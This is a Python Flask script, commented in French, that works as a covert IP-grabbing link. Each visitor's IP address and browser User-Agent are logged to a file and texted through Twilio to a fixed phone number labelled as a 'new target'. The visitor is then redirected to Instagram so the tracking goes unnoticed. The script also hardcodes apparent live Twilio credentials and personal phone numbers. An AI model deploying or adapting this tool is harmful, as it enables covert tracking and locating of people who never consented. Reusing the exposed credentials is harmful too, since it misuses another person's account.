from flask import Flask, request, redirect
from twilio.rest import Client
import datetime

app = Flask(__name__)

# Config Twilio (remplace par les tiens)
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
from_number = '+12524866318'
to_number = '+33635960569'

client = Client(account_sid, auth_token)

def get_real_ip():
    # Récupère l'IP publique (via proxy ou pas)
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip = request.remote_addr
    return ip

def send_sms(ip, user_agent):
    message = f"[NOUVELLE CIBLE]\nIP: {ip}\nUser-Agent: {user_agent}"
    try:
        sms = client.messages.create(
            body=message,
            from_=from_number,
            to=to_number
        )
        print(f"SMS envoyé : {sms.sid}")
    except Exception as e:
        print(f"Erreur envoi SMS : {e}")

def log_to_file(ip, user_agent):
    with open("log.txt", "a") as f:
        f.write(f"\n[{datetime.datetime.now()}] IP: {ip}, UA: {user_agent}")

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get('User-Agent')
    print(f"[+] IP: {ip} | UA: {user_agent}")

    send_sms(ip, user_agent)
    log_to_file(ip, user_agent)

    return redirect("https://www.instagram.com")  # Modifiable

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
